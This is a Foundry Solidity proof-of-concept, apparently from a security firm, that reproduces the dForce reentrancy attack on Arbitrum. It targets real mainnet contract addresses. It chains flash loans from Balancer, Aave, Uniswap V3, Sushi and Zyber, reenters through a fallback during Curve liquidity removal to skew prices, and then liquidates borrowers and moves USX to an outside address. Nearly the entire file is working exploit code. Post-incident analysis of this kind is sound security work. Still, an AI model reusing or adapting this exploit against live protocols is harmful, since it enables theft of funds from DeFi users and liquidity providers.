// SPDX-License-Identifier: UNLICENSED
//dForcenet Re-entry attack poc
//tx：https://arbiscan.io/tx/0x5db5c2400ab56db697b3cc9aa02a05deab658e1438ce2f8692ca009cc45171dd
//twitter：https://twitter.com/dForcenet/status/1623904209161830401
//Copyright Reserved by Numen Cyber Technology：https://twitter.com/numencyber
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Counter.sol";
using stdStorage for StdStorage;
interface USX{
    function approve(address spender, uint256 amount)
    external
    returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
interface WETH{
    function approve(address spender, uint256 amount)
    external
    returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 amount) external;
    function deposit() external payable;
    function transfer(address recipient, uint256 amount) external returns (bool);
}
interface USDC{
    function approve(address spender, uint256 amount)
    external
    returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
interface wstETHCRV{
    function approve(address spender, uint256 amount)
    external
    returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function mint(address addr,uint256 value) external returns(bool);
}
interface wstETH{
    function approve(address spender, uint256 amount)
    external
    returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
interface VYPER{
    function exchange_underlying(int128 i, int128 j, uint256 _dx, uint256 _min_dy) external returns(uint256);

}
interface UniswapV2Router02{

}
interface WSTVYPER{
    function add_liquidity(uint256[2] memory amounts,uint256 min_mint_amount) external payable returns(uint256);
    function deposit(uint256 amount) external;
    function approve(address spender, uint256 amount)
    external
    returns (bool);
    //function remove_liquidity_one_coin(uint256 _token_amount,int128 i,uint256 _min_amount) external returns(uint256);
    function remove_liquidity(uint256 _amount,uint256[2] memory min_amounts) external returns(uint256[2] memory);
    function exchange(int128 i,int128 j,uint256 dx,uint256 min_dy) external returns(uint256);
}
interface UNKNOW{

}
interface wstETHCRVgauge{
    function add_liquidity(uint256[2] memory amounts,uint256 min_mint_amount) external returns(uint256);
    function deposit(uint256 amount) external;
    function approve(address spender, uint256 amount)
    external
    returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function withdraw(uint256 amount) external;
}
contract Fake{
    USX usx=USX(0x641441c631e2F909700d2f41FD87F0aA6A6b4EDb);
    WETH weth=WETH(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    USDC usdc=USDC(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    wstETHCRV wstethcrv=wstETHCRV(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);
    wstETH wsteth=wstETH(0x5979D7b546E38E414F7E9822514be443A4800529);
    VYPER vyper=VYPER(0x2ce5Fd6f6F4a159987eac99FF5158B7B62189Acf);
    UniswapV2Router02 uniswap=UniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
    WSTVYPER wstvyper=WSTVYPER(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);
    UNKNOW unknow=UNKNOW(0xC462fF1063172BAC6f6823A17ED181a0586f0FC8);
    BRIDGE bridge=BRIDGE(0x37f9aE2e0Ea6742b9CAD5AbCfB6bBC3475b3862B);
    NETH neth=NETH(0x3ea9B0ab55F34Fb188824Ee288CeaEfC63cf908e);
    BALANCER balancer=BALANCER(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    aArbWETH arbweth=aArbWETH(0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8);
    AAVEPOOL aavepool=AAVEPOOL(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    RWETH rweth=RWETH(0x15b53d277Af860f51c3E6843F8075007026BBb3a);
    LENDINGPOOL lendingpool=LENDINGPOOL(0x2032b9A8e9F7e76768CA9271003d3e43E1616B1F);
    UNISWAPV3POOL uniswapv3pool=UNISWAPV3POOL(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    SUSHI sushi=SUSHI(0xB7E50106A5bd3Cf21AF210A755F9C8740890A8c9);
    SUSHIC sushic=SUSHIC(0x905dfCD5649217c42684f23958568e533C711Aa3);
    SUSHID sushid=SUSHID(0x0C1Cf6883efA1B496B01f654E247B9b419873054);
    ZLP zlp=ZLP(0x8b8149Dd385955DC1cE77a4bE7700CCD6a212e65);
    SWAPFLASHLOAN swapflashloan=SWAPFLASHLOAN(0xa067668661C84476aFcDc6fA5D758C4c01C34352);
    wstETHCRVgauge wstethcrvgauge=wstETHCRVgauge(0x098EF55011B6B8c99845128114A9D9159777d697);
    function func_0xd2676ca9() external{
        wstethcrv.approve(address(wstethcrvgauge),type(uint256).max);
        uint256 r13=wstethcrv.balanceOf(address(this));
        wstethcrvgauge.deposit(r13);
        wstethcrvgauge.approve(address(unknow),type(uint256).max);
        wstethcrvgauge.balanceOf(address(this));
        address(unknow).call(hex"4381c41a000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000006741e1ac8515c30c3000000000000000000000000000000000000000000001b87506a3e7b0d4000000");
        uint256 r14=usx.balanceOf(address(this));
        usx.transfer(address(0xb4c79daB8f259C7Aee6E5b2Aa729821864227e84),r14);
    }
}
interface BRIDGE{
    function swapETHAndRedeemAndSwap(
        address to,
        uint256 chainId,
        address token,
        uint8 tokenIndexFrom,
        uint8 tokenIndexTo,
        uint256 dx,
        uint256 minDy,
        uint256 deadline,
        uint8 swapTokenIndexFrom,
        uint8 swapTokenIndexTo,
        uint256 swapMinDy,
        uint256 swapDeadline
    ) external payable;
}
interface NETH{

}
interface BALANCER{
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}
interface aArbWETH{

}
interface AAVEPOOL{
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
interface RWETH{

}
interface LENDINGPOOL{
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
interface UNISWAPV3POOL{
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
}
interface SUSHI{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface SUSHIC{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface SUSHID{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface ZLP{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface SWAPFLASHLOAN{
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes memory params
    ) external;
}
interface c462{
    function borrowBalanceStored(address addr) external returns(uint256);
    function liquidateBorrow(address addr,uint256 amount,address addr1) external;
}

interface x61af{
    function closeFactorMantissa() external returns(uint256);
    function liquidateCalculateSeizeTokens(
        address _iTokenBorrowed,
        address _iTokenCollateral,
        uint256 _actualRepayAmount
    ) external view returns (uint256);
}
interface x2ce4{
    function balanceOf(address account) external view returns (uint256);
    function redeem(address _from, uint256 _redeemiToken)
    external;
}
interface VAULT{
    function swap(address _tokenIn, address _tokenOut, address _receiver) external returns (uint256);
}
contract Exp is Test {

    function setUp() public {
    }
    USX usx=USX(0x641441c631e2F909700d2f41FD87F0aA6A6b4EDb);
    WETH weth=WETH(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    USDC usdc=USDC(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
    wstETHCRV wstethcrv=wstETHCRV(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);
    wstETH wsteth=wstETH(0x5979D7b546E38E414F7E9822514be443A4800529);
    VYPER vyper=VYPER(0x2ce5Fd6f6F4a159987eac99FF5158B7B62189Acf);
    UniswapV2Router02 uniswap=UniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
    WSTVYPER wstvyper=WSTVYPER(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);
    UNKNOW unknow=UNKNOW(0xC462fF1063172BAC6f6823A17ED181a0586f0FC8);
    BRIDGE bridge=BRIDGE(0x37f9aE2e0Ea6742b9CAD5AbCfB6bBC3475b3862B);
    NETH neth=NETH(0x3ea9B0ab55F34Fb188824Ee288CeaEfC63cf908e);
    BALANCER balancer=BALANCER(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    aArbWETH arbweth=aArbWETH(0xe50fA9b3c56FfB159cB0FCA61F5c9D750e8128c8);
    AAVEPOOL aavepool=AAVEPOOL(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    RWETH rweth=RWETH(0x15b53d277Af860f51c3E6843F8075007026BBb3a);
    LENDINGPOOL lendingpool=LENDINGPOOL(0x2032b9A8e9F7e76768CA9271003d3e43E1616B1F);
    UNISWAPV3POOL uniswapv3pool=UNISWAPV3POOL(0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443);
    SUSHI sushi=SUSHI(0xB7E50106A5bd3Cf21AF210A755F9C8740890A8c9);
    SUSHIC sushic=SUSHIC(0x905dfCD5649217c42684f23958568e533C711Aa3);
    SUSHID sushid=SUSHID(0x0C1Cf6883efA1B496B01f654E247B9b419873054);
    ZLP zlp=ZLP(0x8b8149Dd385955DC1cE77a4bE7700CCD6a212e65);
    SWAPFLASHLOAN swapflashloan=SWAPFLASHLOAN(0xa067668661C84476aFcDc6fA5D758C4c01C34352);
    c462 C462=c462(0xC462fF1063172BAC6f6823A17ED181a0586f0FC8);
    x61af x61Af=x61af(0x61afB763bc265bD372e8Af8daC00196C9A5eCea0);
    x2ce4 x2Ce4=x2ce4(0x2cE498b79C499c6BB64934042eBA487bD31F75ea);
    wstETHCRVgauge wstethcrvgauge=wstETHCRVgauge(0x098EF55011B6B8c99845128114A9D9159777d697);
    VAULT vault=VAULT(0x489ee077994B6658eAfA855C308275EAd8097C4A);
    uint256 public flag=0;
    uint256 public flag1=0;
    address[] tokens;
    uint256[]  amounts;
    uint256[]  amounts1;
    address[]  tokens1;
    uint256[] modes;
    uint256[2] amounts2;
    uint256[2] amounts3;
    Fake fake=new Fake();
    function testa() public{
//        vm.prank(address(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80));
//        wstethcrv.mint(address(this),92593342188272805411);
//        vm.prank(address(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80));
//        wstethcrv.mint(address(this),1);
        //                               5826862719037310

        usx.approve(address(vyper),type(uint256).max);
        weth.approve(address(uniswap),type(uint256).max);
        usdc.approve(address(uniswap),type(uint256).max);
        wstethcrv.approve(address(wstvyper),type(uint256).max);
        wsteth.approve(address(wstvyper),type(uint256).max);
        usx.approve(address(unknow),type(uint256).max);
        bridge.swapETHAndRedeemAndSwap{value: 0.5 ether}(address(this),10,address(neth),1,0,500000000000000000,490000000000000000,block.timestamp,0,1,478762298341358862,1676070358);
        uint256 r1=weth.balanceOf(address(balancer));
        tokens.push(address(weth));
        amounts.push(r1);
        balancer.flashLoan(address(this),tokens,amounts,hex"00");
        console2.log(usx.balanceOf(address(this)));
        console2.log(weth.balanceOf(address(this)));
    }
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external{
        uint256 r2=weth.balanceOf(address(this));
        uint256 r3=weth.balanceOf(address(address(arbweth)));
        aavepool.flashLoanSimple(address(this),address(weth),r3,hex"00",0);
        weth.transfer(address(balancer),7734802042534805053227);
        vyper.exchange_underlying(0,1,500000000000000000000000,0);
        usdc.balanceOf(address(this));
        usdc.transfer(address(vault),493757293760);
        vault.swap(address(usdc),address(weth),address(this));
    }
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool){
        uint256 r4=weth.balanceOf(address(rweth));
        amounts1.push(r4);
        tokens1.push(address(weth));
        modes.push(0);
        lendingpool.flashLoan(address(this),tokens1,amounts1,modes,address(this),hex"00",0);
        weth.approve(address(aavepool),type(uint256).max);
        return true;
    }
    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external returns (bool){
        uint256 r5=weth.balanceOf(address(uniswapv3pool));
        uniswapv3pool.flash(address(this),r5,0,hex"000000000000000000000000000000000000000000000195d2c5f12a45d27f66");
        weth.approve(address(lendingpool),type(uint256).max);
        return true;
    }
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external{
        uint256 r6=weth.balanceOf(address(sushi));
        sushi.swap(0,r6-1,address(this),hex"00");
        weth.transfer(address(uniswapv3pool),7489862219914774917605);
    }
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external{
        if(flag==0){
            flag=1;
            uint256 r7=weth.balanceOf(address(sushic));
            sushic.swap(r7-1,0,address(this),hex"00");
            weth.transfer(address(sushi),8100533813826781330800);
        }
        if(flag==1){
            flag=2;
            uint256 r8=weth.balanceOf(address(sushid));
            sushid.swap(0,r8-1,address(this),hex"00");
            weth.transfer(address(sushic),8572537415357389243727);
        }
        if(flag==2){
            flag=3;
            uint256 r9=weth.balanceOf(address(zlp));
            zlp.swap(r9-1,0,address(this),hex"00");
            weth.transfer(address(sushid),3299717733927635895333);
        }

    }
    function ZyberCall(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external{
        uint256 r10=weth.balanceOf(address(swapflashloan));
        swapflashloan.flashLoan(address(this),address(weth),r10-500000000000000000,hex"00");
        weth.transfer(address(zlp),7362276368777357959668);
    }
    function executeOperation(
        address pool,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata params
    ) external{
        uint256 r11=weth.balanceOf(address(this));
        console2.log(r11);
        amounts2[0]=r11;
        amounts2[1]=0;
        weth.withdraw(r11);
        uint256 r12=wstvyper.add_liquidity{value:r11}(amounts2,0);
        wstethcrv.transfer(address(fake),1904761904761904761904);
        fake.func_0xd2676ca9();
        amounts3[0]=0;
        amounts3[1]=0;
        wstvyper.remove_liquidity(63438591176197540597712,amounts3);
        wstethcrv.balanceOf(address(this));
        wstvyper.remove_liquidity(2924339222027299635899,amounts3);
        wsteth.balanceOf(address(this));
        wstvyper.exchange(1,0,3806284554234843164918,0);
        weth.deposit{value:69447.353171002791821315 ether}();
        weth.transfer(address(swapflashloan),2891104884995864970528);
    }
    fallback() external payable{
        if(flag1==1){
            flag1=2;
            C462.borrowBalanceStored(address(fake));
            x61Af.closeFactorMantissa();
            uint256 r15=x61Af.liquidateCalculateSeizeTokens(address(C462),address(x2Ce4),1040000000000000000000000);
            uint256 r16=x2Ce4.balanceOf(address(fake));
            C462.liquidateBorrow(address(fake),560525526525080924601515,address(x2Ce4));
            C462.borrowBalanceStored(address(0x916792f7734089470de27297903BED8a4630b26D));
            x61Af.closeFactorMantissa();
            x61Af.liquidateCalculateSeizeTokens(address(C462),address(x2Ce4),300037034111437845493368);
            x2Ce4.balanceOf(address(0x916792f7734089470de27297903BED8a4630b26D));
            C462.liquidateBorrow(address(0x916792f7734089470de27297903BED8a4630b26D),300037034111437845493368,address(x2Ce4));
            x2Ce4.balanceOf(address(this));
            x2Ce4.redeem(address(this),2924339222027299635899);
            wstethcrvgauge.balanceOf(address(this));
            wstethcrvgauge.withdraw(2924339222027299635899);
        }
        if(flag1==0){
            flag1=1;
        }
        if(flag1==2){
            flag1=3;
        }
    }
}
